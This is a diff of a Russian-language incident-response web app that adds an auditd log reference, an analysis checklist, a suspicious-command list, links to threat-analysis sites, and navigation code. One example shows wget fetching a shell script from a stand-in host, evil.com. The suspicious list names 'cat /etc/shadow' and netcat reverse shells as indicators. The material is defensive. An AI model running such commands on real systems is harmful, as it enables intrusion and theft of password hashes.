+        <div style="font-size:11px;color:var(--text3);margin-top:4px;font-family:monospace">res=success / res=failed</div>
+      </div>
+      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-sm);padding:12px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
+          <code style="font-size:13px;color:var(--blue);font-weight:700">a0= a1= a2=</code>
+          <span style="font-size:11px;color:var(--text3)">аргументы команды</span>
+        </div>
+        <div style="font-size:12px;color:var(--text2)">a0 = команда, a1 = первый аргумент</div>
+        <div style="font-size:11px;color:var(--text3);margin-top:4px;font-family:monospace">a0="wget" a1="http://evil.com/shell.sh"</div>
+      </div>
+      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-sm);padding:12px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
+          <code style="font-size:13px;color:var(--blue);font-weight:700">uid= / euid=</code>
+          <span style="font-size:11px;color:var(--text3)">пользователь</span>
+        </div>
+        <div style="font-size:12px;color:var(--text2)">uid = реальный, euid = эффективный</div>
+        <div style="font-size:11px;color:var(--text3);margin-top:4px;font-family:monospace">euid=0 → процесс работает как root!</div>
+      </div>
+      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-sm);padding:12px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
+          <code style="font-size:13px;color:var(--blue);font-weight:700">pid= / ppid=</code>
+          <span style="font-size:11px;color:var(--text3)">ID процесса</span>
+        </div>
+        <div style="font-size:12px;color:var(--text2)">pid = процесс, ppid = родитель</div>
+        <div style="font-size:11px;color:var(--text3);margin-top:4px;font-family:monospace">ppid=1234 → запущен процессом 1234</div>
+      </div>
+      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:var(--radius-sm);padding:12px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
+          <code style="font-size:13px;color:var(--blue);font-weight:700">comm= / exe=</code>
+          <span style="font-size:11px;color:var(--text3)">имя и путь</span>
+        </div>
+        <div style="font-size:12px;color:var(--text2)">comm = имя команды, exe = полный путь</div>
+        <div style="font-size:11px;color:var(--text3);margin-top:4px;font-family:monospace">comm="wget" exe="/usr/bin/wget"</div>
+      </div>
+    </div>
+
+    <div class="section-title">Типы записей</div>
+    <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
+      <div style="display:flex;gap:10px;padding:9px 12px;background:var(--bg3);border-radius:6px">
+        <code style="font-size:12px;color:var(--blue);font-weight:700;flex-shrink:0">USER_AUTH</code>
+        <span style="font-size:12px;color:var(--text2)">Попытка входа (SSH, sudo)</span>
+      </div>
+      <div style="display:flex;gap:10px;padding:9px 12px;background:var(--bg3);border-radius:6px">
+        <code style="font-size:12px;color:var(--blue);font-weight:700;flex-shrink:0">USER_LOGIN</code>
+        <span style="font-size:12px;color:var(--text2)">Вход в систему</span>
+      </div>
+      <div style="display:flex;gap:10px;padding:9px 12px;background:var(--bg3);border-radius:6px">
+        <code style="font-size:12px;color:var(--blue);font-weight:700;flex-shrink:0">EXECVE</code>
+        <span style="font-size:12px;color:var(--text2)">Запуск команды/программы</span>
+      </div>
+      <div style="display:flex;gap:10px;padding:9px 12px;background:var(--bg3);border-radius:6px">
+        <code style="font-size:12px;color:var(--blue);font-weight:700;flex-shrink:0">SYSCALL</code>
+        <span style="font-size:12px;color:var(--text2)">Системный вызов (содержит pid, uid)</span>
+      </div>
+      <div style="display:flex;gap:10px;padding:9px 12px;background:var(--bg3);border-radius:6px">
+        <code style="font-size:12px;color:var(--blue);font-weight:700;flex-shrink:0">PATH</code>
+        <span style="font-size:12px;color:var(--text2)">Обращение к файлу (поле name=)</span>
+      </div>
+    </div>
+
+    <div class="section-title">Алгоритм анализа</div>
+    <div class="alert-card green">
+      <div class="alert-title">Последовательность поиска</div>
+      <ul class="alert-list">
+        <li>1. Найти res=failed → кто атаковал (addr=)</li>
+        <li>2. Найти res=success → когда прорвались</li>
+        <li>3. Найти EXECVE после входа → что делали (a0=)</li>
+        <li>4. Найти euid=0 → когда получили root</li>
+        <li>5. Найти PATH после root → что украли (name=)</li>
+      </ul>
+    </div>
+
+    <div class="section-title" style="margin-top:16px">Подозрительные команды</div>
+    <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:16px">
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fef2f2;border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">wget / curl</code>
+        <span style="font-size:12px;color:var(--text2)">Скачивание файлов извне</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fef2f2;border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">linpeas / linenum</code>
+        <span style="font-size:12px;color:var(--text2)">Инструменты разведки Linux</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fef2f2;border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">chmod +x</code>
+        <span style="font-size:12px;color:var(--text2)">Делает файл исполняемым</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fef2f2;border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">cat /etc/shadow</code>
+        <span style="font-size:12px;color:var(--text2)">Кража хэшей паролей</span>
+      </div>
+      <div style="display:flex;justify-content:space-between;padding:9px 12px;background:#fef2f2;border-radius:6px">
+        <code style="font-size:13px;color:var(--red);font-weight:700">nc / ncat</code>
+        <span style="font-size:12px;color:var(--text2)">Netcat — обратный шелл</span>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ==================== СПРАВОЧНИК: САЙТЫ ==================== -->
+<div id="screen-ref-sites" class="hidden screen-inner">
+  <header class="section-header">
+    <button class="back-btn" onclick="openSection('ref')" aria-label="Назад">‹</button>
+    <div class="section-header-title">🔗 Полезные сайты</div>
+  </header>
+  <div class="section-content">
+    <div class="section-title">Анализ угроз</div>
+    <div style="display:flex;flex-direction:column;gap:8px;margin-bottom:20px">
       <a href="https://id-ransomware.malwarehunterteam.com" target="_blank" class="copy-btn" style="text-decoration:none">
         <div class="copy-icon">🔍</div>
         <div class="copy-info">
           <div class="copy-title">ID Ransomware</div>
-          <div class="copy-code">Определить семейство шифровальщика по файлу</div>
+          <div class="copy-code">Определить семейство по файлу требования</div>
         </div>
-        <div style="font-size:16px;color:var(--text3)">↗</div>
+        <div style="font-size:18px;color:var(--text3)">↗</div>
       </a>
       <a href="https://www.nomoreransom.org/ru/index.html" target="_blank" class="copy-btn" style="text-decoration:none">
         <div class="copy-icon">🔓</div>
@@ -2879,15 +3077,7 @@ cmd /c mklink /d C:\ShadowRestore &quot;$path&quot;">
           <div class="copy-title">No More Ransom</div>
           <div class="copy-code">Бесплатные дешифраторы от Europol и Kaspersky</div>
         </div>
-        <div style="font-size:16px;color:var(--text3)">↗</div>
-      </a>
-      <a href="https://2ip.ru" target="_blank" class="copy-btn" style="text-decoration:none">
-        <div class="copy-icon">🌐</div>
-        <div class="copy-info">
-          <div class="copy-title">2ip.ru</div>
-          <div class="copy-code">Проверить IP — страна и организация</div>
-        </div>
-        <div style="font-size:16px;color:var(--text3)">↗</div>
+        <div style="font-size:18px;color:var(--text3)">↗</div>
       </a>
       <a href="https://www.virustotal.com" target="_blank" class="copy-btn" style="text-decoration:none">
         <div class="copy-icon">🦠</div>
@@ -2895,20 +3085,40 @@ cmd /c mklink /d C:\ShadowRestore &quot;$path&quot;">
           <div class="copy-title">VirusTotal</div>
           <div class="copy-code">Проверить файл или IP на вирусы (70+ антивирусов)</div>
         </div>
-        <div style="font-size:16px;color:var(--text3)">↗</div>
+        <div style="font-size:18px;color:var(--text3)">↗</div>
       </a>
+      <a href="https://2ip.ru" target="_blank" class="copy-btn" style="text-decoration:none">
+        <div class="copy-icon">🌐</div>
+        <div class="copy-info">
+          <div class="copy-title">2ip.ru</div>
+          <div class="copy-code">Проверить IP — страна и организация</div>
+        </div>
+        <div style="font-size:18px;color:var(--text3)">↗</div>
+      </a>
+    </div>
+    <div class="section-title">Инструменты</div>
+    <div style="display:flex;flex-direction:column;gap:8px">
       <a href="https://live.sysinternals.com" target="_blank" class="copy-btn" style="text-decoration:none">
         <div class="copy-icon">🛠️</div>
         <div class="copy-info">
           <div class="copy-title">Sysinternals Live</div>
-          <div class="copy-code">Autoruns, Process Monitor и другие от Microsoft</div>
+          <div class="copy-code">Autoruns, ProcessMonitor от Microsoft</div>
         </div>
-        <div style="font-size:16px;color:var(--text3)">↗</div>
+        <div style="font-size:18px;color:var(--text3)">↗</div>
+      </a>
+      <a href="https://blueteamlabs.online" target="_blank" class="copy-btn" style="text-decoration:none">
+        <div class="copy-icon">🎯</div>
+        <div class="copy-info">
+          <div class="copy-title">Blue Team Labs Online</div>
+          <div class="copy-code">Практика IR на реальных логах</div>
+        </div>
+        <div style="font-size:18px;color:var(--text3)">↗</div>
       </a>
     </div>
-
   </div>
 </div>
+
+
 
 <!-- ==================== ЧЕКЛИСТ ДО ВЫЕЗДА ==================== -->
 <div id="screen-checklist-before" class="hidden screen-inner">
@@ -3432,7 +3642,7 @@ document.getElementById('pass-input').addEventListener('keydown', e => {
 // ==============================
 // НАВИГАЦИЯ
 // ==============================
-const SCREENS = ['loading','login','main','section','call','analysis','shadow','1c','wazuh','act','cases','price','settings','flash','crm','ref','checklist-before','checklist-after','contract'];
+const SCREENS = ['loading','login','main','section','call','analysis','shadow','1c','wazuh','act','cases','price','settings','flash','crm','ref','checklist-before','checklist-after','contract','ref-ip','ref-ports','ref-proc','ref-virus','ref-audit','ref-sites'];
 let currentScreen = 'loading';
 let prevScreen = null;
 
@@ -3473,6 +3683,12 @@ function openSection(id) {
   if (id === 'flash')    { showScreen('flash');    return; }
   if (id === 'crm')      { showScreen('crm'); loadClients(); return; }
   if (id === 'ref')              { showScreen('ref');              return; }
+  if (id === 'ref-ip')           { showScreen('ref-ip');           return; }
+  if (id === 'ref-ports')        { showScreen('ref-ports');        return; }
+  if (id === 'ref-proc')         { showScreen('ref-proc');         return; }
+  if (id === 'ref-virus')        { showScreen('ref-virus');        return; }
+  if (id === 'ref-audit')        { showScreen('ref-audit');        return; }
+  if (id === 'ref-sites')        { showScreen('ref-sites');        return; }
   if (id === 'checklist-before') { showScreen('checklist-before'); return; }
   if (id === 'checklist-after')  { showScreen('checklist-after');  return; }
   if (id === 'contract')         { initContract(); showScreen('contract'); return; }
@@ -3487,7 +3703,7 @@ function openSection(id) {
 }
 
 function goBack() {
-  const mainScreens = ['call','analysis','shadow','1c','wazuh','act','cases','price','settings','flash','crm','ref','checklist-before','checklist-after','contract','section'];
+  const mainScreens = ['call','analysis','shadow','1c','wazuh','act','cases','price','settings','flash','crm','ref','checklist-before','checklist-after','contract','ref-ip','ref-ports','ref-proc','ref-virus','ref-audit','ref-sites','section'];
   if (mainScreens.includes(currentScreen)) {
     showScreen('main');
   } else if (prevScreen && prevScreen !== currentScreen) {
@@ -3499,7 +3715,7 @@ function goBack() {
 
 window.addEventListener('popstate', e => {
   e.preventDefault();
-  if (['call','analysis','shadow','1c','wazuh','act','cases','price','settings','flash','crm','ref','checklist-before','checklist-after','contract','section'].includes(currentScreen)) {
+  if (['call','analysis','shadow','1c','wazuh','act','cases','price','settings','flash','crm','ref','checklist-before','checklist-after','contract','ref-ip','ref-ports','ref-proc','ref-virus','ref-audit','ref-sites','section'].includes(currentScreen)) {
     goBack();
     history.pushState(null, '', location.href);
   }
